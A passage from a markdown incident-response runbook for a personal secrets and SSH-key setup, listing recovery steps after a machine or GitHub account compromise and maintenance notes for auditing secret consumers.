5. Invalidate all mount caches ([secrets-lifecycle.md cache invalidation](secrets-lifecycle.md#cache-invalidation))

### Machine compromise

1. Do not trust any material on the compromised machine
2. Invalidate mount cache if Crostini
3. Rotate the SSH key for that hostname (UC-4a)
4. Rotate any secrets that were present on the machine
5. Deregister old SSH key from registries
6. Check `ssh-add -l` on other machines to verify no cross-contamination
7. If the compromised machine had an active `op` session: treat as 1Password compromise (above)

### GitHub account compromise

1. Regain account access, enable 2FA if not already
2. Audit repo history for injected commits: `git log --all --oneline` compared against local copy
3. If malicious commits found: do not run `update-env` on any machine until the repo is verified clean
4. Force-push a known-good state from a trusted machine
5. Rotate SSH keys (the attacker may have replaced `.pub` sidecars to enable their own key)

## Maintenance

- **Update this doc** when changing credential storage, adding new secret consumers, modifying trust boundaries, or after security incidents.
- **Audit command** for secret consumers: `grep -rn 'secrets/' update-env scripts/ contexts/`
- **Known secrets** are inventoried in [secrets-lifecycle.md](secrets-lifecycle.md#known-secrets).
